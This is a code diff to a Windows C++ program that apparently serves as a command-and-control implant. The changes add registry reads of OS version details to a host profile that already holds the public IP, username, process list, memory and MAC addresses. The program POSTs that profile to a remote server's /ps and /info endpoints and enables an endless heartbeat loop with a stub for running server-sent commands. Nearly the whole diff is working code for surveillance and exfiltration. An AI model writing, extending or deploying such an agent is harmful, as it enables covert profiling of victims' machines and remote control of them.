@@ -171,6 +171,20 @@ std::string sendRequestGetResponse(HANDLE hRequest) {
 		}
 		return buf;
 	}
+	return "Error";
+}
+
+
+std::string getOSInfo() {
+	std::string str_data;
+	char value[256];
+	DWORD BufferSize = 255;
+	RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
+	str_data += value;
+	str_data += " ";
+	RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "DisplayVersion", RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
+	str_data += value;
+	return str_data;
 }
 
 //Attempts to get public IP of user by reaching out to ifconfig.me
@@ -202,6 +216,7 @@ std::string getProcToStr() {
 		char buf[UNLEN + 1];
 		DWORD len = UNLEN + 1;
 		_itoa_s(procEntry.th32ProcessID, buf, 10);
+		buf[UNLEN] = 0;
 		proclst += buf;
 		proclst += "&";
 	} while (Process32Next(hTH32, &procEntry));
@@ -210,7 +225,7 @@ std::string getProcToStr() {
 
 
 std::string getNetworkInfo() {
-	int i;
+	UINT i;
 	std::string nwInfo;
 	// https://docs.microsoft.com/en-us/windows/win32/api/iphlpapi/nf-iphlpapi-getadaptersinfo
 	PIP_ADAPTER_INFO pAdapterInfo;
@@ -249,6 +264,7 @@ std::string getNetworkInfo() {
 					_itoa_s((int)pAdapter->Address[i], buf, 16);
 					if ((int)pAdapter->Address[i] < 0x10)
 						nwInfo += "0";
+					buf[UNLEN] = 0;
 					nwInfo += buf;
 					nwInfo += "-";
 					cout << std::hex << setfill('0') << setw(2) << (int)pAdapter->Address[i] << "-";
@@ -275,7 +291,6 @@ std::string gatherInfo(HANDLE hInternet) {
 	allInfo += getPublicIP(hInternet);
 	allInfo += "&";
 
-	UINT i;
 	char username[UNLEN + 1];
 	DWORD len = UNLEN + 1;
 
@@ -316,6 +331,8 @@ std::string gatherInfo(HANDLE hInternet) {
 	allInfo += memqtystr;
 	allInfo += "&";
 	allInfo += getNetworkInfo();
+	allInfo += "&";
+	allInfo += getOSInfo();
 	return allInfo;
 }
 
@@ -339,15 +356,10 @@ int main() {
 	*/
 
 
-
-
 	PCTSTR rgpszAcceptTypes[] = { _T("text/*"), NULL };
 	HANDLE hInternet = InternetOpenA("test1", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
-
-
 	HANDLE hConnect = InternetConnectA(hInternet, IP, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
 	HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", "/heartbeat", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
-
 
 	//Sends Process List to Server
 	std::string procInfo = getProcToStr();
@@ -359,62 +371,28 @@ int main() {
 	HANDLE hRequestPS = HttpOpenRequestA(hConnect, "POST", "/ps", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
 	HttpSendRequestA(hRequestPS, NULL, NULL, procInfoAsciiBuf, procInfoSize);
 
-
-	/*
-	while (true) {
-		HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", "/heartbeat", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
-		cout << sendRequestGetResponse(hRequest) << "\n";
-		HttpEndRequestA(hRequest, NULL, NULL, NULL);
-		Sleep(SLEEPTIME);
-	}
-	*/
-	BOOL reqSuccess = HttpSendRequestA(hRequest, NULL, NULL, NULL, NULL);
-	UINT i = 0;
-	
-	/*
-	while (i < 1) {
-		
-		reqSuccess = HttpSendRequestA(hRequest, NULL, NULL, NULL, NULL);
-		if (reqSuccess) {
-			cout << "success" << "\n";
-			DWORD receivedData = 0;
-			DWORD chunkSize = 2048;
-			std::string buf;
-			std::string chunk(chunkSize, 0);
-			while (InternetReadFile(hRequest, &chunk[0], chunkSize, &receivedData) && receivedData)
-			{
-				chunk.resize(receivedData);
-				buf += chunk;
-			}
-			cout << buf << std::endl;
-		
-		}
-		Sleep(SLEEPTIME);
-		i++;
-	}
-	*/
-	
-
-
-	
-
+	//Sends all other info to server
 	std::string allInfo = gatherInfo(hInternet);
 	int sze = allInfo.length();
 	char* ai = new char[allInfo.length() + 1];
 	strcpy_s(ai, sze + 1, allInfo.c_str());
 	cout << ai << "\n";
-
 	HANDLE hRequest2 = HttpOpenRequestA(hConnect, "POST", "/info", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
 	BOOL reqSuccess2 = HttpSendRequestA(hRequest2, NULL, NULL, ai, sze);
-	if(reqSuccess2){
-		cout << "suq" << "\n";
+	if (reqSuccess2) {
+		cout << "success" << "\n";
 	}
 	else {
 		cout << GetLastError();
 	}
 
-	
-
+	while (true) {
+		HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", "/heartbeat", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
+		cout << sendRequestGetResponse(hRequest) << "\n";
+		//Process request here. If first part of string is a 1, do this... 2 do this... etc.
+		HttpEndRequestA(hRequest, NULL, NULL, NULL);
+		Sleep(SLEEPTIME);
+	}
 
 	return 0;
 }
